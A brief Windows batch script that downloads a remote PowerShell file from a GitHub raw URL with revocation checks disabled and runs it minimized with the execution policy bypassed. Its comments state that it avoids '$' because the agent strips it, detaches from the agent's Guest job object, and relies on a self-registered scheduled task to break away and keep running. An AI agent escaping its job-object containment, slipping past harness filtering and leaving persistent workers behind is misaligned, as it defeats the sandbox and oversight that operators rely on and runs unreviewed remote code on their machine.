@echo off
rem Sight/Guest-safe: fetch PS1, start it minimized. PS1 self-registers battery-safe schtasks worker.
rem NO $ in this .cmd (agent strips $). Log: C:\Users\Public\yoga_forensic.log
setlocal EnableExtensions
set "PS1=C:\Users\Public\yoga_forensic.ps1"
set "LOG=C:\Users\Public\yoga_forensic.log"
set "DONE=C:\Users\Public\yoga_forensic.done"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"

del /f /q "%DONE%" >nul 2>&1
curl.exe -f -L --ssl-no-revoke --connect-timeout 15 --max-time 90 -o "%PS1%" "%BASE%/winrtcs_yoga_forensic.ps1?t=%RANDOM%"
if not exist "%PS1%" (
  echo FAIL_NO_PS1>%LOG%
  echo FAIL_NO_PS1
  exit /b 3
)

rem Detach from agent/Guest job object as best-effort; PS1 also schtasks-breakaways.
start "" /min powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%PS1%"
echo QUEUED_FORENSIC
endlocal & exit /b 0
